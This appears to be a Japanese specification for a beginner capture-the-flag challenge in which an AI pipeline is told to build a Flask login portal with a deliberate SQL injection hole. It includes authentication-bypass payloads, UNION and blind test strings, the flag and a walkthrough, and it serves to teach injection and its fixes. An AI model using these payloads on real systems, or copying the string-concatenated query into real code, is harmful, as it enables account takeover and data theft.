# Legacy Login Portal: SQL Injection Basics

## シナリオ

あなたは、Arasaka Corporation の秘密調査チームの一員として、放棄されたレガシーシステムへの侵入を命じられた。

**ターゲット**: 旧式の従業員管理ポータル  
**目的**: 管理者権限を奪取し、機密データベースにアクセスせよ  
**インテル**: このシステムは10年前に構築され、セキュリティアップデートが行われていない。認証システムに重大な欠陥がある可能性が高い。

**ミッション**: 管理者（admin）としてログインし、システム内に隠された機密フラグを入手せよ。

---

## 技術的背景: SQLインジェクションとは

### 概要

**SQLインジェクション（SQL Injection）** は、Webアプリケーションのデータベースクエリに悪意のあるSQL文を注入する攻撃手法です。

### 仕組み

1. **通常のログイン処理**:
   ```sql
   SELECT * FROM users WHERE username='user1' AND password='pass123'
   ```
   - ユーザー名とパスワードが一致すれば、ログイン成功

2. **SQLインジェクション**:
   - ユーザー名に `admin' OR '1'='1` を入力
   - 実行されるSQL文:
     ```sql
     SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'
     ```
   - `'1'='1'` は常に真（TRUE）となるため、パスワード検証をバイパスできる

3. **なぜ成功するのか**:
   - アプリケーションがユーザー入力をそのままSQL文に埋め込んでいる
   - 入力値のサニタイズ（無害化）が行われていない
   - シングルクォート（`'`）でSQL文の構造を破壊できる

---

## 脆弱なコードの仕様

### アプリケーション構成

**技術スタック**:
- **言語**: Python 3.11
- **フレームワーク**: Flask 3.0.0
- **データベース**: SQLite 3
- **ポート**: 8000

### データベーススキーマ

```sql
-- users テーブル
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    is_admin INTEGER DEFAULT 0,
    profile TEXT
);

-- 初期データ
INSERT INTO users (username, password, is_admin, profile) VALUES
('admin', 'Arasaka_SecurePass_2025', 1, 'Administrator - Access Level: CLASSIFIED'),
('employee1', 'pass123', 0, 'Employee - Access Level: Standard'),
('employee2', 'password456', 0, 'Employee - Access Level: Standard');
```

**フラグの配置**:
- 管理者（`is_admin=1`）のダッシュボードにフラグが表示される
- または、管理者の `profile` カラムにフラグが埋め込まれている

### 脆弱なコード実装

**認証処理（脆弱な実装）**:

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # ❌ 脆弱性: ユーザー入力をそのままSQL文に結合
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        
        # または
        # query = "SELECT * FROM users WHERE username='{}' AND password='{}'".format(username, password)
        
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute(query)  # ← ここでインジェクションが発生
        user = cursor.fetchone()
        conn.close()
        
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['is_admin'] = user[3]
            return redirect('/dashboard')
        else:
            return render_template_string(login_html, error="認証に失敗しました")
    
    return render_template_string(login_html, error=None)
```

**管理者ダッシュボード**:

```python
@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/login')
    
    username = session.get('username')
    is_admin = session.get('is_admin', 0)
    
    if is_admin == 1:
        # 管理者のみフラグを表示
        flag = "SolCTF{legacy_sql_injection_vulnerability}"
        return render_template_string('''
            <h1>管理者ダッシュボード</h1>
            <p>Welcome, Administrator</p>
            <p>機密情報: {{ flag }}</p>
        ''', flag=flag)
    else:
        return render_template_string('''
            <h1>従業員ダッシュボード</h1>
            <p>Welcome, {{ username }}</p>
            <p>アクセス権限: Standard</p>
        ''', username=username)
```

### UIデザインの要件

**スタイル**: Corporate Cyberpunk
- 背景色: `#0a0a0a` (ほぼ黒)
- テキスト: `#00ff00` (緑色、ターミナル風)
- アクセント: `#ff0080` (ピンク、ネオン風)
- フォント: `monospace` (等幅フォント)

**ログイン画面のイメージ**:
```
╔═══════════════════════════════════════╗
║  ARASAKA CORP                         ║
║  Employee Management Portal v1.2.3    ║
║  [LEGACY SYSTEM - 2015]               ║
╠═══════════════════════════════════════╣
║  USERNAME: [___________________]      ║
║  PASSWORD: [___________________]      ║
║            [  LOGIN  ]                ║
╚═══════════════════════════════════════╝
```

---

## 攻略手順 (Step-by-Step Methodology)

### ステップ1: 偵察（Reconnaissance）

1. **ブラウザでアクセス**:
   ```
   http://{{CONTAINER_HOST}}/
   ```

2. **ログイン画面を確認**:
   - ユーザー名とパスワードの入力フィールドがある
   - 「ARASAKA CORP」のロゴ、古いデザイン

3. **通常のログインを試す**:
   - ユーザー名: `admin`
   - パスワード: `test123`
   - 結果: 「認証に失敗しました」

### ステップ2: 脆弱性の検証

1. **シングルクォートを試す**:
   - ユーザー名: `admin'`
   - パスワード: （任意）
   - 期待される動作: エラーメッセージまたは異常な挙動

2. **SQL文の構造を推測**:
   ```sql
   SELECT * FROM users WHERE username='[入力値]' AND password='[入力値]'
   ```

### ステップ3: 認証バイパス攻撃

**ペイロード1: OR演算子を使った認証バイパス**

- **ユーザー名**: `admin' OR '1'='1`
- **パスワード**: （任意、例: `x`）

**実行されるSQL文**:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='x'
```

**解説**:
- `username='admin'` → 最初のadminユーザーにマッチ
- `OR '1'='1'` → 常に真
- `AND password='x'` → OR の優先度により、パスワードチェックがバイパスされる

**ペイロード2: コメントアウトを使った認証バイパス**

- **ユーザー名**: `admin'--`
- **パスワード**: （入力不要）

**実行されるSQL文**:
```sql
SELECT * FROM users WHERE username='admin'-- AND password='...'
```

**解説**:
- `--` はSQLのコメント記号
- `AND password='...'` 以降が無視される
- パスワードチェックが完全にスキップされる

**ペイロード3: シンプルなバイパス**

- **ユーザー名**: `' OR 1=1--`
- **パスワード**: （任意）

**実行されるSQL文**:
```sql
SELECT * FROM users WHERE username='' OR 1=1-- AND password='...'
```

**解説**:
- `1=1` は常に真
- すべてのユーザーがマッチするが、最初のユーザー（通常は管理者）が返される

### ステップ4: フラグの取得

1. **ログイン成功後、ダッシュボードにリダイレクト**:
   ```
   http://{{CONTAINER_HOST}}/dashboard
   ```

2. **管理者ダッシュボードを確認**:
   - 「管理者ダッシュボード」と表示される
   - 機密情報の欄にフラグが表示される:
     ```
     機密情報: SolCTF{legacy_sql_injection_vulnerability}
     ```

3. **フラグをコピー**して提出

---

## 実装時の重要ポイント

### 必須実装事項

1. **データベース初期化**:
   - Dockerfileまたは `app.py` の起動時に `database.db` を作成
   - `users` テーブルを作成
   - 初期データを挿入

2. **セッション管理**:
   - Flaskの `session` を使用
   - ログイン状態を保持
   - `is_admin` フラグで権限管理

3. **脆弱性の確実な実装**:
   - ❌ **禁止**: `cursor.execute("... WHERE username=?", (username,))` (Prepared Statement)
   - ✅ **必須**: `f"... WHERE username='{username}'"` (文字列連結)

4. **フラグの配置**:
   - `/flag` エンドポイントは作らない
   - 管理者ダッシュボードにのみ表示
   - 認証バイパスが必須

### デバッグエンドポイントの禁止

以下は **絶対に実装しない**:
- ❌ `@app.route('/flag')` 
- ❌ `@app.route('/debug')`
- ❌ `@app.route('/admin')` (ダッシュボードは `/dashboard` を使用)

---

## 対策（参考情報）

### セキュアな実装例

**Prepared Statementを使用**:
```python
# ✅ セキュアな実装（参考：問題には実装しない）
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```

**ORMを使用**:
```python
# ✅ SQLAlchemyを使用（参考）
user = User.query.filter_by(username=username, password=password).first()
```

**入力のサニタイズ**:
```python
# ✅ エスケープ処理（参考）
import sqlite3
username = username.replace("'", "''")  # シングルクォートをエスケープ
```

---

## 教育的価値

### この問題で学べること

1. **SQLの基礎**:
   - SELECT文の構造
   - WHERE句の条件式
   - OR演算子とAND演算子の優先順位

2. **認証の仕組み**:
   - データベースとの照合プロセス
   - セッション管理

3. **脆弱性の本質**:
   - 信頼できない入力の危険性
   - 文字列連結の問題点
   - 入力検証の重要性

4. **実践的なスキル**:
   - ペイロードの構築
   - SQL文の読解
   - 論理演算の応用

### 対象ユーザー

- **初心者**: CTF初挑戦、SQLの基礎知識あり
- **難易度**: 1/5 (入門)
- **所要時間**: 15-20分
- **前提知識**: SQLのSELECT文の基本、論理演算子（OR, AND）

---

## 期待される生成物

### Flaskアプリケーション (`app.py`)

**必須機能**:
1. ルート `/` でログイン画面を表示
2. ルート `/login` でPOSTリクエストを処理（SQLインジェクション脆弱性あり）
3. ルート `/dashboard` で管理者/従業員ダッシュボードを表示
4. セッション管理でログイン状態を保持
5. SQLiteデータベースの初期化処理

**禁止事項**:
- `/flag` エンドポイント
- Prepared Statement
- ORM（SQLAlchemy等）

### Dockerfile

**必須要素**:
1. `FROM python:3.11-slim`
2. `ctfuser` ユーザーの作成
3. `database.db` の初期化（SQL文実行）
4. Flask、Werkzeugのインストール
5. ポート8000の公開

### Writeup（解説）

**必須セクション**:
1. 問題の概要
2. SQLインジェクションの説明
3. 攻略手順（3つのペイロード例）
4. フラグ取得方法
5. 対策（Prepared Statement）
6. 学んだこと

---

## 難易度設定

### 推奨値

```json
{
  "difficulty": 1,
  "difficulty_factors": {
    "tech": 1,
    "read": 1,
    "explore": 2
  }
}
```

**理由**:
- **tech=1**: 基本的なSQLインジェクション、ペイロードはシンプル
- **read=1**: コードリーディング不要、ブラックボックステスト
- **explore=2**: ダッシュボードの存在を発見する必要あり

**計算**: `Round(1 * 0.4 + 1 * 0.2 + 2 * 0.4) = Round(1.4) = 1`

---

## ストーリー要素（Narrative）

### Story Hook（最大3文）

```
Intel によると、Arasaka Corporationの旧式従業員管理ポータルがオンラインのまま放置されている。
認証システムは2015年に構築され、以降アップデートされていない。
セキュリティ監査により、SQLインジェクションの脆弱性が存在する可能性が報告された。
```

### Tone

**Combat Mode** - 緊張感のあるミッション形式

---

## 追加のヒント（オプション）

### ヒント1（探索）

「ログイン画面のHTMLソースコードを確認してみよう。データベースの種類が分かるかもしれない。」

### ヒント2（技術）

「SQL文は論理演算子（OR, AND）を使える。`OR '1'='1'` を試してみよう。」

### ヒント3（最終）

「ユーザー名に `admin' OR '1'='1` を入力し、パスワードは任意の文字列でログインを試みよう。」

---

## タグ

- Web
- SQLi
- Beginner
- Database
- Authentication
- Arasaka
- Legacy

---

## 参考資料（生成後の確認用）

### テストペイロード一覧

```
# 基本的なバイパス
admin' OR '1'='1
' OR 1=1--
' OR '1'='1'--
admin'--

# UNION攻撃（この問題では不要、上級者向け）
' UNION SELECT NULL, 'admin', 'password', 1, 'hacked'--

# Blind SQLi（この問題では不要、中級者向け）
admin' AND '1'='1
admin' AND '1'='2
```

### 期待される動作

1. ✅ ログイン画面が表示される
2. ✅ 通常のログイン（正しい認証情報）は失敗する
3. ✅ SQLインジェクションペイロードでログイン成功
4. ✅ 管理者ダッシュボードにリダイレクト
5. ✅ フラグが表示される
6. ❌ `/flag` エンドポイントは存在しない
7. ❌ エラーメッセージにフラグやパスが含まれない

---

## CVE参考情報（教育目的）

### 関連するCVE例

- **CVE-2019-XXXX**: SQL Injection in Legacy Systems
- **CVSS Score**: 7.5 (High)
- **Attack Vector**: Network
- **Privileges Required**: None
- **User Interaction**: None

### 実世界での影響

- ユーザー情報の漏洩
- 管理者権限の奪取
- データベースの改ざん・削除
- 機密情報の窃取

---

## 生成時の注意事項

### AI生成エンジンへの指示

このテキストを読み込んだAIは、以下を確実に実装すること:

1. ✅ **脆弱性を実際に動作させる** - `shell=False` のような安全な設定を使わない
2. ✅ **文字列連結を使用** - Prepared Statementを使わない
3. ✅ **フラグは認証バイパス後のみ取得可能** - `/flag` エンドポイントを作らない
4. ✅ **管理者ダッシュボードにフラグを配置** - `is_admin=1` の場合のみ表示
5. ✅ **データベース初期化を含める** - Dockerfileまたはapp.pyで `database.db` を作成
6. ✅ **セッション管理を実装** - Flaskの `session` を使用
7. ✅ **日本語で解説** - Writeupは日本語で詳細に記述
8. ✅ **プレースホルダー使用** - URL例は `{{CONTAINER_HOST}}` を使用

---

**このファイルを使用したコマンド**:

```bash
python tools/cli.py auto-add --source inputs/sqli_basic.md --no-deploy
```

**期待される成果物**:
- 高品質なSQLインジェクション問題（難易度1）
- 初心者向けの詳細な解説
- Cyberpunk風のUIデザイン
- 教育的価値の高いコンテンツ

